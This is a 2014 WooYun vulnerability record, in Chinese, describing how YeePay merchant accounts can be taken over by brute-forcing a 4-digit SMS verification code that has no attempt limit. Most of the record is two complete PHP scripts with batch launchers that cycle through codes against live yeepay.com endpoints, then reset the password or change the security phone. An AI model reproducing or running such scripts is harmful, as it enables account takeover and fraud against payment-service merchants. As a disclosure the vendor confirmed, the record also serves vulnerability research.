{"id": 55579, "wybug_id": "wooyun-2014-060501", "wybug_title": "易宝支付任意修改密码漏洞（爆破）", "wybug_corp": "易宝支付", "wybug_author": "糊涂刺猬", "wybug_date": "2014-05-16 14:32", "wybug_open_date": "2014-06-30 14:33", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏校验", "逻辑错误", "设计不当", "认证设计不合理", "手机短信", "支付行业敏感"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-30：\t细节向公众公开  简要描述： 知道商户的注册邮箱，可以任意修改商户密码，以及更换密保手机 详细说明：  1.由于对手机认证码的验证次数不识别的原因，4位数字验证码可以在10分钟穷举出用户密码首页，点击找回密码后，输入用户email以及验证码，点击发送验证码。之后可以无限次的试验证码，由于验证码只有4位，通过程序穷举。2.修改新密码后，可以登录进入会员中心，修改动态密码手机，理由如1.   漏洞证明：  忘记密码：forget.bat\nset PATH=%cd%\\php\\;%cd%\\php\\extset PHPRC=%cd%\\php\\cls%cd%\\php\\php.exe %cd%\\forget.php 0pause\nforget.php\n<?php$newpassword='my198191';$num= intval($argv[1]);$user=array(\t'user_name'=>'用户名');\t$num=$num+1000;\tfor($i=$num;$i<10000;$i++){\t\t$user['dynapasswd']=$i;\t\t$data=get_michtml(\"https://www.yeepay.com/selfservice/verifyCallBackPwdInfo.action\",$user,\"GBK\",\"SSL\",\"yeepay_pay\",\"yeepay_pay\");\t\techo $data['output'].\"\\r\\n\";\t\t$output=$data['output'];\t\t$output=str_replace(\"{\",'{\"',$output);\t\t$output=str_replace(\"}\",'\"}',$output);\t\t$output=str_replace(':','\":\"',$output);\t\t$output=str_replace(',','\",\"',$output);\t\t$outdata=json_decode($output,true);\t\tif(isset($outdata['retCode']) && ($outdata['retCode']==\"1\")){\t\t\techo '验证码为:'.$i.\"\\r\\n\".$data['output'];\t\t\tunset($user['dynapasswd']);\t\t\t$user['method']=\"init\";\t\t\t$user['callbackType']=\"mobile\";\t\t\t$data=get_michtml(\"https://www.yeepay.com/selfservice/forgotPwdRetrieve.action\",$user,\"GBK\",\"SSL\",\"yeepay_pay\",\"yeepay_pay\");\t\t\t$user['method']=\"retrieve\";\t\t\t$user['password']=$newpassword;\t\t\t$user['password1']=$newpassword;\t\t\t$data=get_michtml(\"https://www.yeepay.com/selfservice/forgotPwdRetrieve.action\",$user,\"GBK\",\"SSL\",\"yeepay_pay\",\"yeepay_pay\");\t\t\techo '新密码为:'.$newpassword;\t\t\tbreak;\t\t}else{\t\t\techo '正在检测:'.$i.\"\\r\\n\";\t\t}\t}sleep(1000000);function get_michtml($url,$data=array(),$html_char='UTF-8',$is_ssh='http',$cookiejar='',$cookiefile=''){\t\t\t  $ch = curl_init();    \t\t\t   curl_setopt($ch, CURLOPT_URL, $url);    \t\t\t   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  \t\t\t   curl_setopt ($ch, CURLOPT_TIMEOUT, 6000);\t\t\t\t   curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/2008052906 Firefox/3.0');\t\t\t   \t\t\t   if($is_ssh=='SSL'){\t\t\t   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\t\t\t\tcurl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); \t\t\t   }\t\t\t   curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1); \t\t\t\tif(!empty($data)){\t\t\t\t\t\t   curl_setopt($ch, CURLOPT_POST, true);    \t\t\t\t\t\t   curl_setopt($ch, CURLOPT_POSTFIELDS, $data);   \t\t\t\t\t\t\t}\t\t\t\t$cookiespath = dirname(__FILE__).DIRECTORY_SEPARATOR;\t\t\t\t\t \t\t\t\t   if($cookiefile){\t\t\t\t\t   curl_setopt($ch, CURLOPT_COOKIEFILE, $cookiespath.$cookiefile.'.txt');\t\t\t\t   }\t\t\t   if($cookiejar){\t\t\t\t\tcurl_setopt($ch, CURLOPT_COOKIEJAR, $cookiespath.$cookiefile.'.txt');\t\t\t   }\t\t\t   $output = curl_exec($ch); \t\t\t \t\t\t   if($html_char!='GBK'){\t\t\t\t\t$output=mb_convert_encoding($output, \"GBK\", $html_char);\t\t\t\t   }\t\t\t   $info = curl_getinfo($ch);\t\t\t   curl_close($ch);\t\t\t$returntemp = array('output'=>$output,'info'=>$info);\t\t\treturn $returntemp;\t\t\t}?>\n修改验证手机：yeepay.bat\nset PATH=%cd%\\php\\;%cd%\\php\\extset PHPRC=%cd%\\php\\cls%cd%\\php\\php.exe %cd%\\yeepay.php 0pause\nyeepay.php\n<?php$num= $argv[1];$user=array(\t'username'=>'用户名',\t'callbackUrl'=>'https://www.yeepay.com/login/shopBack/',\t'password'=>'密码',);$data=get_michtml(\"https://www.yeepay.com/selfservice/customerLoginInterface.action\",$user,\"GBK\",\"SSL\",\"yeepay_login\",\"yeepay_login\");$prex='/<input type=\"hidden\" name=\"(.*)\" value=\"(.*)\" \\/>/isU';preg_match_all($prex, $data[\"output\"], $reg);if(isset($reg[1]) &&(count($reg[1])==2)){\t$user=array();\t$user[$reg[1][0]]=$reg[2][0];\t$user[$reg[1][1]]=$reg[2][1];\t$data=get_michtml(\"https://www.yeepay.com/selfservice/validateCustomerCert.action\",$user,\"GBK\",\"SSL\",\"yeepay_login\",\"yeepay_login\");\tif(!$num){\t\t$data=get_michtml(\"http://www.yeepay.com/selfservice/sendModifyMobileSMSAjax.action\",$user,\"GBK\",\"http\",\"yeepay_login\",\"yeepay_login\");\t}\t$num=$num+1000;\tfor($i=$num;$i<10000;$i++){\t\t$user=array(\t\t\"smsCode\"=>$i,\t\t\t);\t\t$data=get_michtml(\"http://www.yeepay.com/selfservice/verifyOldMobileSms.action\",$user,\"GBK\",\"SSL\",\"yeepay_login\",\"yeepay_login\");\t\tif(stristr($data[\"output\"],\"验证码错误\")){\t\t\techo \"检测:\".$i.\"\\r\\n\";\t\t}else{\t\t\tif(stristr($data[\"output\"],\"verifyNewMobileSms.action\")){\t\t\t\t\t\t\t\t\techo \"验证码为:\".$i.\"\\r\\n\";\t\t\tbreak;\t\t\t}else{\t\t\t\techo \"疑似检测:\".$i.\"\\r\\n\";\t\t\t\t\t\t}\t\t}\t}\t\t}else{\techo '用户名密码错误';}sleep(10000000);function get_michtml($url,$data=array(),$html_char='UTF-8',$is_ssh='http',$cookiejar='',$cookiefile=''){\t\t\t  $ch = curl_init();    \t\t\t   curl_setopt($ch, CURLOPT_URL, $url);    \t\t\t   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  \t\t\t   curl_setopt ($ch, CURLOPT_TIMEOUT, 6000);\t\t\t\t   curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/2008052906 Firefox/3.0');\t\t\t   \t\t\t   if($is_ssh=='SSL'){\t\t\t   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\t\t\t\tcurl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); \t\t\t   }\t\t\t   curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1); \t\t\t\tif(!empty($data)){\t\t\t\t\t\t   curl_setopt($ch, CURLOPT_POST, true);    \t\t\t\t\t\t   curl_setopt($ch, CURLOPT_POSTFIELDS, $data);   \t\t\t\t\t\t\t}\t\t\t\t$cookiespath = dirname(__FILE__).DIRECTORY_SEPARATOR;\t\t\t\t\t \t\t\t\t   if($cookiefile){\t\t\t\t\t   curl_setopt($ch, CURLOPT_COOKIEFILE, $cookiespath.$cookiefile.'.txt');\t\t\t\t   }\t\t\t   if($cookiejar){\t\t\t\t\tcurl_setopt($ch, CURLOPT_COOKIEJAR, $cookiespath.$cookiefile.'.txt');\t\t\t   }\t\t\t   $output = curl_exec($ch); \t\t\t \t\t\t   if($html_char!='GBK'){\t\t\t\t\t$output=mb_convert_encoding($output, \"GBK\", $html_char);\t\t\t\t   }\t\t\t   $info = curl_getinfo($ch);\t\t\t   curl_close($ch);\t\t\t$returntemp = array('output'=>$output,'info'=>$info);\t\t\treturn $returntemp;\t\t\t}?>\n   修复方案：     版权声明：转载请注明来源 糊涂刺猬@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-05-19 14:12 厂商回复： 感谢您的提交，请将联系方式发送我们，以便我们发送礼物已表谢意 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}